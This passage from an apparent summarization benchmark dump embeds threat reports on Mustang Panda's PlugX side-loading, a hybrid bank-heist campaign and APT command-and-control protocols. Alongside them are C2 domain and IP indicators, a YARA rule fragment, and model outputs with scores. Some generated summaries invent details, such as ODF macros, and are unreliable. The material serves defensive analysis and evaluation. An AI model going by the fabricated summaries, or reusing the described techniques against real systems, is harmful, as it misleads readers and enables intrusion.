encrypted data blob, which is typically paired with a DLL loader as well as a benign application.This actor has commonly employed the stealthy technique of side-loading the malicious DLLs into legitimate applications during execution. This action then deploys the PlugX implant into memory.We noted threat actors had used three separate legitimate applications within our RAR files; A free VPN service, and two legitimate HP applications related to HP\u2019s Digital Imaging. Each legitimate application was bundled with a DLL and a data file. In two out of the three RAR files, the DAT file masqueraded as a different file format, such as JSON or CHM.3/6Upon execution of the legitimate application, the threat loads a malicious DLL loader in a specific set order, which the threat actor has strategically placed in the same folder to replace a legitimate one. This proceeds to side-load the DLL by abusing the DLL search order, which is a technique also known as DLL Search Order Hijacking. The malicious DLL is then loaded into the legitimate application, where it decrypts, loads and deploys the malicious PlugX implant. This execution chain is shown in Figure 5.Figure 5 \u2013 PlugX side-loading execution chain Technical AnalysisThe DLL loader is heavily obfuscated and employs dynamic API resolution upon runtime. It retrieves a handle to the encrypted PlugX implant, then reads the data into a newly allocated region within memory. Execution is then passed to the implant, where the shellcode is executed, and it XOR decrypts the embedded payload, as shown in Figure 6. Once decryption is complete, RtlDecompressBuffer is called to decompress the decrypted payload to its final form as shown in Figure 7.Figure 6 \u2013 Decryption routine4/6Figure 7 \u2013 Decrypted payload header ConclusionMustang Panda, which is publicly known as a Chinese-affiliated APT group, has an established history of using the PlugX malware and targeting nations throughout South-East Asia. This threat actor has been previously linked to campaigns targeting Myanmar government entities using custom lures and compromising the website of the office of Myanmar\u2019s president.The TTPs associated with the campaign covered in this report align with those of Mustang Panda. We observed a typical attack chain employed by the group, where attackers used a benign executable to side-load a malicious DLL loader, which then decrypts and loads the PlugX implant. We have also confirmed the C2 infrastructure associated with this campaign has been used to target entities in Myanmar, including a government VPN portal, from early March onwards. Indicators of Compromise (IoCs) FileSHA256 ColorLaserJet.rarNetworkDescriptionencompassing a legit signed utility + a DLL a legit signed utility + a DLL a legit signed utility + a DLL Update[.]hilifimyanmar[.]com Download[.]hilifimyanmar[.]com Domain Images[.]myanmarnewsonline[.]orgDomain www[.]myanmarnewsonline[.]org Domain 154[.]204[.]26[.]120 45[.]134[.]83[.]4 Defense Yara Rule for Mustang PandaIP C&Crule targeted_MustangPanda_dll { meta: description = \"Rule to detect malicious DLL originally used to target Myanmar\" author = \"The BlackBerry Research & Intelligence team\" version = \"1.0\" last_modified = \"2022-08-02\" license = \"This Yara rule is provided under the Apache License 2.0 (url and open or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research uint16(0) == 0x5A4D and filesize < 10MB and any of them }MITRE ATT&CKT1583.001 Acquire Infrastructure: DomainsT1027 Obfuscated Files or InformationT1036.005 Masquerading: Match Legitimate Name or LocationT1574.002 Hijack Execution Flow: DLL Side-LoadingD3FENDD3-FA (File Analysis)D3-LFP (Local File Permissions)D3-DA (Dynamic Analysis)D3-EFA (Emulated File Analysis)D3-EAL (Executable Allowlisting)D3-SCA (System Call Analysis)6/6 ", "generated_text": "the BlackBerry Research & Intelligence Team; Mustang Panda; HoneyMyte; Bronze President; Red Delta; Southeast Asian; C2 domains; Myanmar news outlets; the malware; phishing emails; malicious documents; the targets; a variety; payloads; Cobalt Strike; Poison Ivy; PlugX; a stealthy technique; side-loading; legitimate applications; the PlugX implant; memory; the shellcode; the credentials; the malware; a command; domains; C2; domains; command; control; domains; C2 domains; Myanmar news outlets; Cobalt Strike beacon; samples; the group; this campaign; Compromise; detection; the malware; legitimate apps; other corroborating evidence; this location; Google; Privacy; a connection; APT; China; threat actors; this campaign; a legitimate application; an Origin Story; the group; the PlugX malware.", "ref_text": "<START-1>The BlackBerry Research & Intelligence Team uncovered a campaign by the China-based advanced persistent threat (APT) group Mustang Panda targeting Myanmar using the PlugX malware family. Mustang Panda typically sends phishing emails with malicious document attachments as an initial infection vector. Once threat actors gain a foothold within a target organization, they typically deploy payloads such as Cobalt Strike or PlugX. The PlugX malware is used by Mustang Panda to deliver the implant in the form of an encrypted data blob, which is typically paired with a DLL loader and a benign application. In this case, the researchers found PlugX payloads bundled with legitimate signed HP utilities in RAR files communicating with domains masquerading as Myanmar news outlets. The executables side-load malicious DLLs which decrypt and deploy the PlugX payload. This aligns with Mustang Panda's typical tactics of using legitimate apps to stealthily deploy PlugX. The researchers found evidence of related activity back to late 2020. Given the targeting of Myanmar entities, use of PlugX, and impersonation of local news, the campaign fits Mustang Panda's modus operandi. Defenders can use the provided indicators of compromise and mitigation techniques to detect this threat. <END-1>", "t5/keyword/hint_hit_precision": 0.23636363636363636, "t5/word/hint_hit_recall": 0.140625, "gpt3/lexical/rouge_rouge1": 0.4729729729729729, "gpt3/lexical/rouge_rouge2": 0.21768707482993196, "gpt3/lexical/rouge_rougeL": 0.30405405405405406, "gpt3/lexical/rouge_rougeLsum": 0.30405405405405406, "gpt3_generated_text": ["The BlackBerry Research & Intelligence Team has uncovered a campaign by the advanced persistent threat group Mustang Panda targeting Myanmar using the PlugX malware. The group impersonates Myanmar news outlets and uses phishing emails with malicious documents to gain access to organizations. PlugX is deployed through legitimate applications, allowing threat actors to access systems and steal sensitive information. This China-based group has a history of cyber-espionage targeting various countries globally. Their tactics include side-loading malicious DLLs into legitimate applications for stealthy execution. The campaign targets Southeast Asian states, with a focus on Myanmar, using deceptive techniques to compromise victims."]}, {"split_name": "val", "sample_id": "val_85", "prompt_text": "Extract the keywords: A TRUSTWAVE SPIDERLABS ADVANCED THREAT REPORTPost-Soviet Bank Heists: A Hybrid Cybercrime StudyPost-Soviet Bank Heists: A Hybrid Cybercrime StudyAuthorsThanassis Diogos EMEA Managing Consultant, Incident Response, TrustwaveSachin Deodhar EMEA Incident Response Consultant, TrustwaveResearch and PublicationRodel Mendrez and Gerald Carsula Malware Research Team, TrustwaveTable of ContentsIntroduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1 A Closer look . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2 Detailed walkthrough . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 Malicious Code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5 Recommendations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7 Indicators of Compromise . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8 Files . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8 IPs/Domains . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8IntroductionEarlier this year, the SpiderLabs team at Trustwave investigated a series of bank breaches originating from post- Soviet states. These investigations took place during mid-to-late 2017, and each bank compromise resulted in a significant amount of stolen funds. The actual amount of money stolen was different in each case, with the average amount around USD$5 million (in cash), ranging from USD$3 to USD$10 million. The investigations showed that the attacks shared a number of common features, such as involving large amount of monetary loss originating from what initially appeared to be legitimate bank customer accounts. Additionally, in all cases, the theft took place using normal cash withdrawals from various ATM terminal locations outside the bank\u2019s originating country.In some cases, the victim banks didn\u2019t even realize that a breach had taken place and a significant amount of money was stolen until well after the attack was completed. In a few cases, the malicious activity was reported to the banks by third-party processors responsible for processing the bank\u2019s debit and credit card transactions. The common feature between these cases is that money was stolen using legitimate ATM cards provided by each bank.Criminals used (or hired) people to personally visit the various branches and request new accounts with minimum or zero initial deposit amounts. Beyond opening their \u201cpersonal\u2019 accounts, they also demanded to receive a debit card with their new account. Initially this might not appear to be an issue since debit card usage is directly related to the account\u2019s balance. However, in the banking world, a service called \u201cOverdraft\u201d exists; simply put it means that under very specific circumstances a debit card can be converted into a credit card. This means that the bank allows their customer to withdraw cash even though they do not have the appropriate balance in their account. Of course, this is supposed to happen only for specific account types, also referred to as risk levels.After the debit cards were delivered to the customers, they were distributed outside the originating country to a group of international conspirators. When all the cards had been relocated to their destination countries, a cyber- criminal, who had already breached the victim bank network, accessed the bank\u2019s internal systems and manipulated the debit cards\u2019 features to enable a high overdraft level and removed anti-fraud controls that had been placed for the specific accounts. Minutes later the operation continued in the countries where the debit cards had travelled. The debit cards were used to perform cash withdrawals from several different ATMs. Within the next few hours the operation concluded, removing up to USD$10 million from each bank.We believe that the attack described in this report represents a clear and imminent threat to financial institutions in European, North American, Asian and Australian regions within the next year. Currently the attacks are localized to the Eastern European and Russian regions. However, in cybercrime, this area is often the canary in the mineshaft for upcoming threats to other parts of the world. Our investigations have revealed victim losses currently around approximately USD$40 million. However, when taking into account the undiscovered or uninvestigated attacks along with investigations undertaken by internal groups or third parties, we estimate losses to be in the hundreds of millions in USD. All global financial institutions should consider this threat seriously and take steps to mitigate it.1A Closer LookTo drill into the details of these criminal operations we will take a closer look at one of the cases. On a winter evening in February 2017, a credit/debit card processor\u2019s fraud management system picked up a series of suspicious ATM withdrawal transactions originating from the victim bank\u2019s customer accounts during the late-night hours until the early morning. The withdrawals occurred at ATM terminals located across the region, including Europe and the Russian Federation. Notably, no ATM transactions occurred in countries where the affected bank had a presence.In addition to requesting the Trustwave SpiderLabs team to perform a thorough investigation, the bank also reported this incident to local law enforcement agencies. Undoubtedly this incident appeared to be multifaceted; it appeared that the bank\u2019s network was breached, and it also seemed likely that the processor\u2019s network may have also been compromised. Moreover, it was also likely that there was a physical facet to this breach, in which an organized cybercriminal network was involved. The Trustwave team\u2019s objective was to investigate the incident based purely on available factual evidence and its unbiased interpretation.The third-party processor engaged an independent team from Trustwave SpiderLabs to investigate the impact of the incident on its network and its overall business. This way Trustwave could see the whole picture from the perspectives of both the affected bank and the third-party processor, whose services the bank used for its card processing functions.The Trustwave team commenced both sides of the investigation immediately and was able to successfully uncover what we believe to be a very interesting, if not entirely unique, modus operandi behind the successful breaches of both the bank and processor networks. The objective of such an operation is the successful withdrawal of funds from the rogue accounts created earlier, as described in this report.The attackers used innovative attack tactics, techniques and procedures to successfully execute a long duration \u201chybrid\u201d attack campaign comprising two physical stages and multiple cyber-attack stages as depicted below:STAGES OF THE ATTACKPhysical Stage I Recruit mules toopen bankaccounts and issuenew debit cardsCyber Stage I Obtain unauthorized privigeged access to the bank\u2019s networkCyber Stage II Compromise third party processor\u2019snetworkCyber Stage III Obtain privileged access to CardManagement SystemCyber Stage IV Activate overdraft on speci\ufb01c bankaccountsPhysical Stage I Cash-out from ATMsin multiple cities and countries2Detailed WalkthroughOur findings suggest that motivation for the attack was purely financial gain. Our analysis shows that the cyber attackers and their physical counterparts worked in close and very effective coordination to execute this malicious operation:\u2022 The cybercriminal network behind this attack recruited so-called \u201cmules\u201d, (non-technical conspirators whosejob is to transfer money for cybercriminals), to open dozens of new bank accounts by physically visiting various branches of this bank in different cities in the country. These individuals used counterfeit documents to request bank accounts, most likely supplied by the organized cybercriminal network. Once these people had new bank accounts approved, they then requested debit/ATM card companions to their new bank accounts. After they obtained these debit cards, they probably handed these debit cards over to a member of the cybercriminal network for distribution outside the country for later use.PHYSICAL PART OF THE ATTACKRecruit mules to apply for new bank accountsSupply mules with fake IDsRogue accountsare createdRequest debit cardsDebit cards are issuedDebit cards sent outside the country\u2022 While the physical activities involving application for accounts and debit cards were taking place at the bank\u2019svarious branches in the country, the cyber attackers gained initial entry, moved laterally and compromised multiple systems inside the bank\u2019s network.GAINING INITIAL FOOTHOLD IN THE BANK NETWORKOpportunisticPhishingEmails to employeeswith maliciousattachments opened \u2013\u2018backdoor\u2019 iscreatedSocialEngineeringAttackers successfullyobtain \u2018backdoor\u2019 Set up multiple \u2018backdoors\u2019 and RDP access to compromisedsystems\u2022 After successfully compromising the bank\u2019s network the cyber attackers then proceeded to launch an attack onthe third-party processor\u2019s network and eventually (after numerous attempts) they succeeded. The bank, due to their established cooperation with the processor, already maintained connectivity with the processor. This made it easier for the criminals because they had already gained access to the bank\u2019s infrastructure and had captured the credentials used to connect to the processor. After gaining foothold into the processor\u2019s network, the attackers compromised the Enterprise Admin account which eventually gave them full access into the infrastructure. Their next step was to execute reconnaissance of the card processing service.3LATERAL MOVEMENT AND SUCCESSFUL COMPROMISE OF BANK NETWORKLeverage ControlWeakness inWindows NetworkLaunch LateralMovementAttackObtain the\u201cKeys to the Kingdom\u201dCompromise Bank Network\u2022 Next, the attackers executed several malicious payloads on the processor\u2019s network, key amongst them wasa legitimate monitoring tool installed on the processor\u2019s Terminal Server (that allowed users to access the card management application via a browser). This software called \u201cMipko\u201d (advertised as \u201cEmployee Monitor\u201d) captures full information, including screen captures, keystrokes and several other types of information for all users who logged into the system and/or accessed the card management application using their respective credentials. In this way the software attackers captured almost 4GB of data within a month. The information captured included keystroke logging and countless screenshots.INSTALLATION OF KEYLOGGER AND COMPROMISE OF THE PROCESSOR NETWORKChoose Staging Pointon Bank NetworkConnect toProcessor NetworkInstall Keyloggeron NetworkCompromiseProcessor Network\u2022 The attackers then identified the accounts on the card management application used by the bank employeeswho had authorization to \u201crequest\u201d changes to the properties of a customer\u2019s debit card, and \u201capprove\u201d or \u201ccommit\u201d such a change. They were looking for such privileges to manipulate each of the cards associated with the rogue accounts created during the preceding months.\u2022 During the day of the final stage attackers used these credentials to:\u2022 Change risk ratings on the rogue accounts from high to low allowing the attackers to activate further creditpermission, known as Overdraft (or simply OD).\u2022 Activate the OD credit function on the accounts.\u2022 Manipulate or remove any anti-fraud control in place for these accounts.\u2022 Change the OD Limit on the accounts from the default value of USD$0 to ranges of USD$25,000 - USD$35,000.Choose PrivilegedUser Accountin CMSRaise Request to Change Debit CardPropertiesFinalize Changesto Debit Card Properties\u2022 The physical counterparts stationed at various locations in Europe and the Russian Federation then cashed out substantial amounts of money for each of these cards from ATM terminals. Cash withdrawals across the region began within minutes of the first OD property change made to the debit cards on the card management application.4COORDINATED ATM CASH WITHDRAWALS ~ MILLIONS OF USDCoordinatedATM WithdrawalsDirect $ Value of Loss:Millions of USDCommand & for CoordinatedCash OutsAs in the preceding phases of the attack, careful planning went into the choice of ATM locations to be used for cash withdrawals, based on the following criteria: 1. Location: those in solitary locations took precedence over those in locations with higher foot traffic. 2. Degree of physical security: ATMs with no security cameras (or those with defective security cameras) werechosen as well as terminals that were not protected by security guards.3. The ability to dispense substantial amounts of cash. ATMs (mis) configured to allow withdrawal of substantialamounts of money were chosen. (Specifically, either very high or no daily withdrawal limits were selected).4. ATM locations were chosen in cities across Europe, (including former Soviet Union countries), and the RussianFederation. No selected ATM was located in the victim bank\u2019s actual country.The final stage of this hybrid operation took almost five hours to complete. This was the time required for each rogue account to be carefully manipulated and for simultaneous debit card withdrawals across the geographic region to occur. As in the first phase of the operation where the mules played an active role in requesting the new accounts and debit cards, in the final phase the mules were employed to perform the cash withdrawals. Only a small number of the ATMs were equipped with security cameras, so a few mules were caught in action. Law enforcement requested video footage from surrounding buildings\u2019 cameras and this revealed that the mules met with other suspects (probably direct members in the cybercrime gang) shortly after cashing out the debit cards. These meetings were most likely to deliver the stolen cash, after keeping their fee.Malicious CodeThroughout the distinct phases of the cyber-attack, we noted that attackers adopted the emerging tactic sometimes called \u201cliving off the land\u201d which involves very limited use of actual malware in the form of malicious files and easily detected protocols associated with Command & Control and data exfiltration traffic. Instead, the attackers used legitimate Windows and PowerShell commands in combination with tools such as PSExec for lateral movement. Notably they also used plink.exe (Windows SSH client) to access RDP over an already established SSH tunnel. Other software components used in this operation were split among commercial monitoring application (Mipko Employee Monitor) and the well-known suspect \u201cCobalt Strike Beacon\u201d mainly used to maintain backdoor connection with an endpoint geolocated in the United States of America.It should be noted that after the attackers penetrated the bank\u2019s network, they continually used a specific system to perform their activities. We focused our investigation on this system after backtracking malicious activities in the processor\u2019s network to it. Remote Desktop activity on the processor network was identified to have originated from the bank system. Eventually we asked the bank to provide this system for investigation. At that point, the bank\u2019s IT staff responded that this system became unbootable shortly after the massive cash out occurred.5When we obtained a copy of the system for analysis we found it was unbootable and the file system was corrupt. However, the Trustwave team was able to reconstruct the partition table and analyze the file system enabling collection and analysis of significant evidence from this key system. One of them was called dropper.exe and upon execution its main function was to wipe the Master Boot Record on the hard disk, effectively destroying the system for any future use. This was the last recorded action taken by the attackers before leaving the network. They appeared to truly care about clearing any remaining tracks of their activity that may have been left behind.Our investigation did not reveal any signs of data exfiltration from the bank itself. The bank\u2019s network appears to have been breached for two primary reasons: 1. The bank had an established mechanism to connect to the processor\u2019s network from several terminals insidethe bank network by first establishing a VPN session between the two networks and then using Remote Desktop Protocol (RDP) to connect from a system inside the bank network to the Windows Terminal Server in the processor\u2019s network. By attacking the bank\u2019s network, the attackers could piggy back on this connection to get a foothold on the processor\u2019s network (and subsequently obtain access to the card management application in the processor\u2019s network)2. To withdraw funds from the newly issued debit cards for the \u201crogue\u201d bank accounts, the attackers neededto obtain credentials of the bank employees that used the card management application on the processor\u2019s network. Using these credentials, they could change the necessary properties of the debit cards to cash out from ATM terminals in the final stage of the attack.Based entirely on the precision with which the attack was carried out, we believe that the attackers had previously obtained deep inside knowledge of the bank\u2019s network and systems. Similarly, they obtained an understanding of the processor\u2019s environment, and of the card management software and how these systems could be used to manipulate a debit card\u2019s sensitive properties such as its overdraft (OD) limit and its Risk Rating. These two parameters are needed to determine the account\u2019s OD limit and therefore how much money the account holder can withdraw.It should also be noted that the attacker\u2019s tradecraft suggests involvement of organized cybercrime groups; for example, the attackers successfully wiped the Master Boot Record (MBR) of the hard disk attached to the main Windows system used in this attack. They used specialized malware intending to thwart any future forensic examination of the system.It goes without saying that the adverse negative impact of this incident was felt by both the bank and the processor:\u2022 The direct dollar value of the loss incurred by the bank pales in comparison with the harder to quantify intangible losses suffered because of loss of trust and goodwill with its customers, partners and regulators. Also, the bank customers\u2019 money remained intact as the debit cards that were used for ATM withdrawals were issued against the newly created rogue accounts, none of which had any balance since they were set up.\u2022 In the case of the processor, while no direct monetary loss was incurred, the processor likely lost much more interms of erosion of trust in their services both with the regulators and their clients (other banks).Direct dollar lossand tangibleadverse impactAdverse impact on trust and goodwill; negative impact onstock pricesBrings weakness in system of controlsto the forefrontDamage to the bank\u2019sreputation is signi\ufb01cantlylarger than directdollar loss6Recommendations\u2022 Banks are advised to prepare a well-documented and tested Incident Response Plan (IRP) so they are betterprepared to deal with such incidents swiftly and effectively.\u2022 In addition to implementing an effective (but inherently reactive) IR Plan, banks are also advised to considersetting up a proactive program for Managed Detection & Response (MDR), also known as threat hunting, which would allow banks to detect threats early on, and mitigate them before they have a chance to realize their full potential.\u2022 The success of these cyber-attacks may be attributed to failures in both technical and non-technical controls, for example, the lack of coupling between the Core Banking System and the Third-Party Card Management System. Had these systems been integrated properly, it would have been much simpler for the changes to the debit card properties to be red-flagged and blocked by the bank prior to successful monetary theft. Another example of a non-technical control failure is that several accounts on the Card Management System were allowed to both \u201craise a request\u201d for a change to be made, and to \u201capprove\u201d such a change. This is in clear violation of the very commonly used type of control in banks and banking applications called Maker-Checker control (or the 4-eye principle). Therefore, banks are advised to undertake not only a proactive cyber security risk assessment exercise, but also to undertake a holistic \u201cbusiness process\u201d risk management exercise to detect and mitigate these types of control weaknesses.\u2022 From a technical standpoint, success of these cyber-attacks may be attributed to the following reasons:\u2022 First, the attackers were able to successfully spear phish and socially engineer bank employees to get an initialfoothold in their networks.\u2022 Second, the attackers took advantage of the common approach of setting the same password for \u201cLocalAdministrator\u201d accounts for all the systems in the Windows network, and the tendency of the systems administrators to use the \u201cDomain Administrator\u201d account (over the network) to perform routine tasks, to malicious usageLegitimate tool but malicious usageMaliciousMaliciousMaliciousMaliciousMaliciousMaliciousMaliciousLegitimate tool but malicious usageLegitimate tool but malicious usageGeo LocationUnited StatesUnited States8trustwave.comCopyright \u00a9 2017 Trustwave Holdings, Inc.PSBH_1017 ", "generated_text": "the report; control; Hybrid Cybercrime; Bank Heists; the attackers; the malware; macros; Malicious Code; the author; researchers; Thanassis diogos; EMEA; the victims; the malware; forensics; the source; files; IPs; domains; the attacks; the bank; the victims; all the malware; the attacks; the phishing emails; the ODF files; the targeted attacks; the hackers; a shadowy spoofed message; the phishing emails; the attackers; the attackers.", "ref_text": "<START-1>The report details a series of bank breaches originating from post-Soviet states in 2017. Trustwave investigated these breaches, which involved the theft of millions in cash from bank customer accounts via ATM withdrawals across Europe and Russia. The attacks involved both cyber and physical components. Physically, mules were recruited to open dozens of new bank accounts under fake IDs. They requested debit cards for these accounts, which were then distributed outside the country to be used later. Cybercriminals separately gained access to the bank's network, then the processor's network, and installed monitoring software to capture employee credentials to access the card management system. Using the stolen credentials, they changed account risk ratings from high to low, activated overdraft privileges, removed anti-fraud controls, and raised debit card withdrawal limits. Then the cards were used by mules at specific ATMs chosen for lack of security, ability to dispense high amounts, and distribution across Europe and Russia. Each account was drained of up to $35,000 via coordinated withdrawals over 5 hours. The report discusses the impacts, which included financial losses for the banks, loss of customer trust, and regulatory issues. It provides recommendations on incident response planning, threat hunting, integrated bank systems, and other cybersecurity best practices. Indicators of compromise are listed including malicious files, IP addresses, domains, and tools used by the attackers. <END-1>", "t5/keyword/hint_hit_precision": 0.21875, "t5/word/hint_hit_recall": 0.049773755656108594, "gpt3/lexical/rouge_rouge1": 0.39164490861618795, "gpt3/lexical/rouge_rouge2": 0.09448818897637797, "gpt3/lexical/rouge_rougeL": 0.19843342036553524, "gpt3/lexical/rouge_rougeLsum": 0.19843342036553524, "gpt3_generated_text": ["In the Trustwave SpiderLabs Advanced Threat Report on Post-Soviet Bank Heists, authors Thanassis Diogos and Sachin Deodhar, along with researchers Rodel Mendrez and Gerald Carsula, investigate a series of bank breaches in post-Soviet states. The attacks, which resulted in significant monetary losses for the victims, involved the use of malicious code and phishing emails to target bank customers and steal funds through ATM withdrawals. The attackers utilized a hybrid cybercrime approach, combining social engineering tactics with advanced malware techniques, such as macros in ODF files, to compromise the banks' systems. The researchers provide detailed recommendations for improving cybersecurity controls to prevent similar attacks in the future. Indicators of compromise, including files, IPs, and domains associated with the attacks, are also provided for forensic analysis and threat detection. Overall, the study sheds light on the sophisticated tactics used by cybercriminals in targeting financial institutions and emphasizes the importance of proactive security measures to mitigate such risks."]}, {"split_name": "val", "sample_id": "val_86", "prompt_text": "Extract the keywords: CommandandControlintheFifthDomainCommandFivePtyLtd February2012ABSTRACTThis\tpaperpresentsthefindingsof\tanextensiveinvestigationinto commandandcontrolinfrastructureusedbyanAdvancedPersistent Threat.\tFindingsincludetechnicaldetailsof\tmalicioussoftware,\tand associated\tcommand\tandcontrolprotocols.\tThesefindingsaredrawn upontoidentify\tmodusoperandi\tand\tdemonstratelinksbetweena numberof\tmajortargeted\tattacksincluding\ttherecentSykipot\tattacks, theJuly\t2011\tSK\tCommunicationshack,\ttheMarch\t2011\tRSA\tbreach, and\ttheseriesofcoordinated\tcyberattacksdubbedNightDragon.Themalwareused\tintheattackwasprogrammed to\tcommunicatewithseveral\u2018callback\u2019domains.The malwarelocateditsC2server(s)byresolvingthese domains into\tIP\taddresses using\tthe ubiquitous Domain Name System (DNS) 3protocol. These communicationsaredepicted\tinFigure1.1.Computer infected withmalware2.3. 4.WARNINGBACKGROUNDThis\tpaperdiscussesmaliciousactivity\tand\tidentifies InternetProtocol(IP)addresses,\tdomainnames,and websites that\tmay\tcontain malicious content. For safety\treasonstheselocationsshouldnot\tbeaccessed, scanned,probed,\torotherwiseinteracted\twithunless theirtrustworthinesscanbeverified. On28\tJuly\t2011\tSKCommunicationsannounced\tit had\tbeenthesubjectof\tahackwhich\tresulted\tinthe theft\tof\tthe personal details of\tup\tto\t35 million people1.\tThe attackers infected a number of\tSK Communicationscomputerswith\tmalicioussoftware (malware)and,byissuingcommandand\tcontrol(C2) instructionstothemalware,wereableto\tgainaccess to,\tand\texfiltratelargequantitiesof\tdata.\tTheattack itself\twascomplex,\twellplannedandlikely\tpartofa broader,concertedhackingeffortattributableto\tan Advanced\tPersistent\tThreat2. 1Fordetails\tofthehack\trefertotheCommand\tFivepaper\u2018SK\tHack byanAdvanced\tPersistentThreat\u2019.(Command\tFivePtyLtd,2011) 2Foradefinitionoftheterm\u2018Advanced\tPersistentThreat\u2019\treferto theCommandFivepaper\u2018Advanced\tPersistentThreats:ADecade inReview\u2019.(CommandFivePtyLtd,2011)DNS serverCommand and The DNS server advises that the callback domain is located at IP address x.x.x.x. The malware communicates with the C2 server located at IP address x.x.x.x to obtain C2 instructions and/or to send a response. The C2 server provides additional C2 instructions to the malware.FIGURE1:DEPICTIONOFCOMMUNICATIONS 3DNSis\tfundamental\tontheInternet.Itisaformofdirectory assistancetohelpcomputers\tcommunicatewith\tothercomputers. Itsuseisanalogoustoapersoncalling\tdirectoryassistancetofind outwhatphonenumbertodial\ttospeak\ttoacertainperson.COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE1OF\t29THE VICTIMSintointrusionsubdomainsOneof\tthecallbacklocationsused\tintheSK Communications hack was \u2018update.alyac.org\u2019.\tThe domainwasregistered\ton24\tSeptember2010\tusing registrationinformationalmost\tidenticalto\tthat\tof\ta legitimatecompany\t\u2013atacticused\tby\ttheattackeron Communicationsnetworkit\tbecamewidely\tknown that\tthe domain was being used for malicious purposes,\tandperhaps\tforthisreason,\ttheoneyear registrationwasnotrenewed\tby\ttheattacker.\tDespite this,\tanumberof\tvictims\taroundtheworld\tcontinued to\tusethedomainto\tlocatetheirC2\tserver,\tresulting inattempted\tcommunicationsto\taC2\tserverthat\tno longerexists. Computersusing\tIP\taddressesallocated\tto\tFrance, thePeople\u2019sRepublicof\tChina,\tPortugal,\tSouthKorea, Taiwan,\ttheUnited\tKingdom\tand\ttheUnited\tStates areamong\tthosethat\tattempted\tto\tcommunicatewith While some of these computers belong to security researchers who deliberately installed malware for research\tpurposes,\tmost\tare victims compromised\tby\tthe attacker either directly\tor indirectly. The victims are from a variety of industries including\tthe technology\tsector,\thigh precisionmanufacturing,\tresearch\tand\tdevelopment, testing\tand certification,\tglobal market research, Eight\tdifferent\ttypes of C2\tcommunications were to \u2018alyac.org\u2019 observed compromised computers. These \u2018DB\u2019,\tand\t\u2018Qdigit\u2019 \u2018Oscar\u2019 which\tare believed\tto\tbe associated\twith\tthesamemalware.\tNoothervictims were observed communicating with 4Other domains registered using a similar tactic include \u2018nprotects.org\u2019, and \u2018trendmicros.net\u2019. (Command \u2018bomuls.com\u2019, FivePtyLtd,2011)THE COMMUNICATIONSTHE \u2018LURK\u2019 COMMUNICATIONSAsinglecomputerwasobserved\tcommunicating\twith thecallbackdomain\u2018path.alyac.org\u2019onTransmission ControlProtocol(TCP)80viathe\u2018LURK\u2019protocol. The communications contained a 15 byte header followedbydatacompressed\tusingtheDEFLATE5 compression method. The header contained a protocolidentifier,sizeand\tcompressioninformation LURK\tprotocol\tidentifier. Hexadecimalbytes\t\u20180x4C\t0x550x52 0x4B\u2019\t(or\u201cLURK\u201dinASCII Hexadecimalbyte\u20180x30\u2019(\u201c0\u201d)inall bytes\t\u20180x780x9c\u20197inallobserved communications,denoting\tthatthe DEFLATEcompressionmethod\twas used\ttocompressthedata(witha *ALL\tVALUES\tARE\tLITTLE ENDIAN\tUNLESS\tOTHERWISE\tSTATED. TABLE1:LURKPROTOCOLFORMAT The decompressed data reveals information about\tthecompromisedcomputersuch\tasits\tname, computerspecificationsand\toperating\tsystem\t(OS) informationasshowninTable2.\tForexample,it \u2018path.alyac.org\u2019 5TheDEFLATEcompressionmethod\tis\tspecified\tinRFC1951. (Deutsch,ZLIB\tCompressedDataFormatSpecificationversion3.3, 1996) 7As\tdescribed\tinSection2.2\tofRFC1950,bits\t0\tto3\tinthefirst byteoftheZLIB\tstreamheaderrepresentthecompressionmethod used,and\tbits\t4\tto8representcompressioninformation.The second\tbyteintheheadercontains\tbitsforanintegritycheck, along\twith\ttwoadditional\tflags.With\tasecond\tbyteof\u20189c\u2019\tthe integritycheck\tpasses\t(as30876\tis\tdivisible\tby31),thepreset dictionaryflagisnotset,andthecompressionlevel\tflag\tindicates thatthedefaultalgorithmwasused\tforcompression.(Deutsch, ZLIB\tCompressed\tDataFormatSpecificationversion3.3,\t1996)thatCOPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE2OF\t29OFDESCRIPTION* Possibleprotocolidentifier.Fixed\tbytes\t\u20180x82 \u20180x00\u2019\tbytes\tinallobserved\tcommunications. \u20180xD0\u2019\tinallobserved\tcommunications. Null terminated\tcomputername. \u20180x00\u2019\tbytes\tinallobserved\tcommunications. Null terminated\taccountname. Horizontal\tscreenresolution(pixels). Vertical\tscreenresolution(pixels). Null terminated\tstring\tcontaining\tamountof memoryand\tunitofmeasurement(e.g. *ALL\tVALUES\tARE\tLITTLE ENDIAN\tUNLESS\tOTHERWISE\tSTATED. communications9are known to be Similar generated\tby\tmalwarethatcommunicateswith\tthe callback domain \u2018office.windowupdate.org\u2019 domainthat\tis\tlinked\tto\t\u2018alyac.org\u2019notonly\tby\tthe communicationsprotocolbut\talso\tby\tboth\tdomain registrationtacticand\tinfrastructure. The domain \u2018windowupdate.org\u2019 administrativeaddressand\tcontact\tinformationlisted inthedomainregistrationis\tidenticalto\tthat\tlisted \u2018windowsupdate.com\u201910.\tThisis\tthesametacticused by\ttheattackerwith\tregistrationof\t\u2018alyac.org\u201911. major and\tminor version numbers, a build number, platform identifierand\tinformationaboutproductsuites\tand\tthelatest ServicePackinstalled.(MicrosoftCorporation,2011) 9Themalware\u2018Troj/Agent UDR\u2019\twith\tMD5\thash\u201842377E724875 2912 5EBE 7C95 02B9 4CD7\u2019 generate is known to communications \u2018LURK0\\xAC\\x01\u2019, \u2018LURK0\\B3\\x01\u2019 \u2019LURK0\\xAD\\x01\u2019, 